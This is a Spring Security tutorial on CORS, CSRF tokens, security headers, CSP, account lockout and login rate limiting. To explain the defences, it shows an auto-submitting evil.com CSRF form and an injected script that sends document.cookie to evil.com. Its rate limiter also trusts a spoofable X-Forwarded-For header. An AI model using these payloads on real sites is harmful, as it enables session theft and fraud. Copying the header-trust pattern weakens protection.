## CORS Flow

```
Browser (https://myapp.com) makes request to API (https://api.myapp.com):

1. Preflight (OPTIONS):
   OPTIONS /api/orders HTTP/1.1
   Origin: https://myapp.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type, Authorization

2. Server response:
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://myapp.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type, Authorization
   Access-Control-Max-Age: 3600

3. Browser: response allows it → sends actual POST request

If server rejects or sends wrong origin:
   Browser: blocks the actual request
   Console: "CORS policy: No 'Access-Control-Allow-Origin' header"
```

## Global CORS Configuration (Recommended)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();

        // Allowed origins — be specific, not wildcard
        configuration.setAllowedOrigins(Arrays.asList(
            "https://myapp.com",
            "https://www.myapp.com"
        ));
        // Or pattern-based:
        // configuration.setAllowedOriginPatterns(List.of("https://*.myapp.com"));

        // Allowed HTTP methods
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"
        ));

        // Allowed headers
        configuration.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With",
            "Accept"
        ));

        // Allow credentials (cookies, Authorization header)
        configuration.setAllowCredentials(true);
        // NOTE: Cannot use setAllowedOrigins("*") with setAllowCredentials(true)!

        // Cache preflight response for 1 hour
        configuration.setMaxAge(3600L);

        // Which response headers browser can access
        configuration.setExposedHeaders(List.of("Authorization", "X-Custom-Header"));

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);  // Apply to all paths
        return source;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))  // Enable CORS
            .csrf(csrf -> csrf.disable())  // For REST APIs
            // ...
        return http.build();
    }
}
```

## Per-Controller @CrossOrigin

```java
// Fine-grained control per controller:
@RestController
@RequestMapping("/api/public")
@CrossOrigin(origins = "*")  // Allow all for public endpoints
public class PublicApiController {
    @GetMapping("/health")
    public String health() { return "OK"; }
}

@RestController
@RequestMapping("/api/orders")
@CrossOrigin(
    origins = {"https://myapp.com"},
    methods = {RequestMethod.GET, RequestMethod.POST},
    allowCredentials = "true"
)
public class OrderController { ... }
```

## Environment-Specific CORS

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();

    if (isDevelopment()) {
        // Development: allow localhost with any port
        config.setAllowedOriginPatterns(List.of(
            "http://localhost:[*]",
            "http://127.0.0.1:[*]"
        ));
    } else {
        // Production: explicit origins only
        config.setAllowedOrigins(corsAllowedOrigins);  // From @Value
    }
    // ...
}

// application.yml:
// cors.allowed-origins: https://myapp.com,https://www.myapp.com
@Value("${cors.allowed-origins:}")
private List<String> corsAllowedOrigins;
```

## Production Reality

Never use `allowedOrigins("*")` with `allowCredentials(true)` — browsers block this. For APIs consumed by known web apps, enumerate origins explicitly in configuration. Use `setAllowedOriginPatterns()` only when you control the subdomain namespace. Consider separate CORS policies per API path: strict for auth endpoints, permissive for public data endpoints.

## CSRF Attack Scenario

```
User: logged into bank.com (has session cookie)
Attacker: evil.com contains:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker-account">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit()</script>

Browser: user visits evil.com → form auto-submits
Browser: includes bank.com session cookie automatically
bank.com: sees valid session → processes transfer!

CSRF protection:
  bank.com embeds CSRF token in the form (random, server-generated)
  evil.com: cannot read the CSRF token (same-origin policy)
  bank.com: validates CSRF token on POST → missing → reject!
```

## When to Enable/Disable CSRF

```
ENABLE CSRF (default) when:
  - Traditional web app (MVC/Thymeleaf/JSP)
  - Session-based authentication (cookies)
  - Browser forms submit state-changing requests

DISABLE CSRF when:
  - REST API with stateless JWT (no cookies)
  - Mobile app clients (no browser, no cookies)
  - Server-to-server communication (no browser)
  - Explicitly using SameSite=Strict cookies as alternative
```

## CSRF Configuration — Session-Based App

```java
// Enable CSRF (default for session-based apps):
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(Customizer.withDefaults())  // Enable CSRF (default)
        // Or customize:
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // Stores CSRF token in cookie readable by JavaScript
            // Client sends it back in X-XSRF-TOKEN header
        );
    return http.build();
}

// Thymeleaf form (auto-includes CSRF):
<form method="post" action="/orders">
    <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
    <!-- Or Thymeleaf handles it automatically: th:action="@{/orders}" -->
</form>
```

## CSRF for SPA + REST API (Double Submit Cookie)

```java
// Modern SPA approach: CSRF token in cookie + header
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        // Sets XSRF-TOKEN cookie (readable by JS)
        // Expects X-XSRF-TOKEN header in POST/PUT/DELETE
    );
    return http.build();
}

// Frontend JavaScript:
const csrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1];
fetch('/api/orders', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': csrfToken  // Required header
    },
    body: JSON.stringify(orderData),
    credentials: 'include'  // Send session cookie
});
```

## SameSite Cookie Alternative

```java
// SameSite=Strict prevents CSRF without tokens:
// Browser doesn't send cookie on cross-site requests

@Bean
public ServletContextInitializer sameSiteCookieInitializer() {
    return servletContext -> {
        servletContext.getSessionCookieConfig().setHttpOnly(true);
        servletContext.getSessionCookieConfig().setSecure(true);
        // SameSite via TomcatContextCustomizer or server config
    };
}

// application.properties:
server.servlet.session.cookie.same-site=strict
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true

// With SameSite=Strict: evil.com form → cookie not sent → no CSRF attack
// Note: breaks some legitimate cross-site navigation scenarios
```

## Production Reality

For new APIs consumed by mobile/SPA with JWT: disable CSRF. For traditional web apps or SPA with cookie-session auth: use `CookieCsrfTokenRepository` (double submit pattern). Set `SameSite=Strict` or `SameSite=Lax` on session cookies as an additional layer. `SameSite=Lax` (browser default in modern browsers) provides protection while allowing top-level navigations from external links.

## Default Security Headers

```
Spring Security adds by default:
  Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  Pragma: no-cache
  Expires: 0
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 0  (deprecated — modern browsers have own XSS protection)
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  (only on HTTPS requests)
```

## Configuring Security Headers

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // Customize HSTS
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000)
            .includeSubDomains(true)
            .preload(true)  // Submit to HSTS preload list
        )

        // Customize frame options
        .frameOptions(frame -> frame.sameOrigin())  // Allow same-origin iframes
        // Or: frame.deny()  — disallow all (default)

        // Content Security Policy (not added by default)
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self' 'nonce-{random}'; " +
                "style-src 'self' https://fonts.googleapis.com; " +
                "img-src 'self' data: https:; " +
                "font-src 'self' https://fonts.gstatic.com; " +
                "connect-src 'self' https://api.myapp.com; " +
                "frame-ancestors 'none'"
            )
        )

        // Referrer policy
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
        )

        // Permissions policy (formerly Feature-Policy)
        .permissionsPolicy(permissions -> permissions
            .policy("camera=(), microphone=(), geolocation=()")
        )
    );
    return http.build();
}
```

## CSP — Content Security Policy

```
Without CSP: attacker injects script into page
  <script>fetch('https://evil.com?cookie='+document.cookie)</script>
  Browser: runs it — steals session cookie!

With CSP: script-src 'self'
  Browser: blocks any script not from same origin
  Injected script: blocked — no cookie theft

CSP Directives:
  default-src 'self'  — block everything not from same origin by default
  script-src 'self' 'nonce-abc'  — only inline scripts with nonce
  style-src 'self' https://fonts.googleapis.com  — allow Google Fonts
  img-src 'self' data:  — allow inline images
  frame-ancestors 'none'  — like X-Frame-Options: DENY
  report-uri /csp-violation  — report violations to endpoint
```

## Disable Default Caching Headers (For Static Assets)

```java
// Default cache-control headers prevent caching everything
// But you want static assets cached!
http.headers(headers -> headers
    .cacheControl(cache -> cache.disable())  // Remove default no-cache
);

// Then configure per-endpoint caching in controllers:
@GetMapping("/api/data")
public ResponseEntity<Data> getData() {
    return ResponseEntity.ok()
        .cacheControl(CacheControl.noCache())  // API: no cache
        .body(data);
}
```

## Production Reality

Check your actual response headers using `curl -I https://yourapi.com/endpoint` and verify expected headers are present. For web applications serving HTML: implement CSP — it's the strongest XSS mitigation available. Start with CSP in report-only mode (`Content-Security-Policy-Report-Only`) to collect violations without breaking functionality, then tighten the policy. Submit your domain to the HSTS preload list once you're confident HTTPS-only is permanent.

## Account Lockout Strategy

```java
@Entity
public class User {
    private boolean locked = false;
    private int failedLoginAttempts = 0;
    private LocalDateTime lockExpiresAt;

    public boolean isAccountNonLocked() {
        if (!locked) return true;
        if (lockExpiresAt != null && lockExpiresAt.isBefore(LocalDateTime.now())) {
            // Auto-unlock after lockout period
            this.locked = false;
            this.failedLoginAttempts = 0;
            return true;
        }
        return false;
    }
}

@Service
public class LoginAttemptService {
    private static final int MAX_ATTEMPTS = 5;
    private static final int LOCKOUT_MINUTES = 30;

    @Transactional
    public void loginFailed(String email) {
        userRepo.findByEmail(email).ifPresent(user -> {
            user.setFailedLoginAttempts(user.getFailedLoginAttempts() + 1);
            if (user.getFailedLoginAttempts() >= MAX_ATTEMPTS) {
                user.setLocked(true);
                user.setLockExpiresAt(LocalDateTime.now().plusMinutes(LOCKOUT_MINUTES));
                log.warn("Account locked: {} after {} failed attempts", email, MAX_ATTEMPTS);
                // Optionally send email notification
            }
            userRepo.save(user);
        });
    }

    @Transactional
    public void loginSucceeded(String email) {
        userRepo.findByEmail(email).ifPresent(user -> {
            user.setFailedLoginAttempts(0);
            user.setLocked(false);
            userRepo.save(user);
        });
    }
}

// Wire into AuthenticationProvider:
@Override
public Authentication authenticate(Authentication auth) throws AuthenticationException {
    try {
        // ... authenticate ...
        loginAttemptService.loginSucceeded(email);
        return authenticatedToken;
    } catch (AuthenticationException e) {
        loginAttemptService.loginFailed(email);
        throw e;
    }
}
```

## IP Rate Limiting with Bucket4j

```xml
<dependency>
    <groupId>com.github.vladimir-bukhtoyarov</groupId>
    <artifactId>bucket4j-core</artifactId>
</dependency>
<dependency>
    <groupId>com.github.vladimir-bukhtoyarov</groupId>
    <artifactId>bucket4j-redis</artifactId>  <!-- For distributed rate limiting -->
</dependency>
```

```java
@Component
public class RateLimitingFilter extends OncePerRequestFilter {

    // In-memory map (single instance) or Redis-backed (distributed)
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    private Bucket resolveBucket(String ip) {
        return buckets.computeIfAbsent(ip, k ->
            Bucket4j.builder()
                .addLimit(Bandwidth.classic(10, Refill.intervally(10, Duration.ofMinutes(1))))
                // 10 requests per minute per IP
                .build()
        );
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws IOException, ServletException {
        if (request.getRequestURI().startsWith("/api/auth/login")) {
            String ip = getClientIp(request);
            Bucket bucket = resolveBucket(ip);

            if (bucket.tryConsume(1)) {
                chain.doFilter(request, response);
            } else {
                response.setStatus(HttpStatus.TOO_MANY_REQUESTS.value());
                response.setContentType(MediaType.APPLICATION_JSON_VALUE);
                response.getWriter().write(
                    "{\"error\": \"Too many requests. Try again later.\"}"
                );
            }
        } else {
            chain.doFilter(request, response);
        }
    }

    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");  // Behind proxy/load balancer
        if (ip != null) ip = ip.split(",")[0].trim();     // Take first IP
        return ip != null ? ip : request.getRemoteAddr();
    }
}
```

## Production Reality

For production, use Redis-backed Bucket4j or a cloud WAF (Cloudflare, AWS WAF) for distributed rate limiting — in-memory rate limits don't work behind load balancers. Always rate-limit the login endpoint, forgot-password, and OTP endpoints — anywhere credentials or tokens are created. Log all lockout events and rate limit violations — they're security intelligence, not just noise.
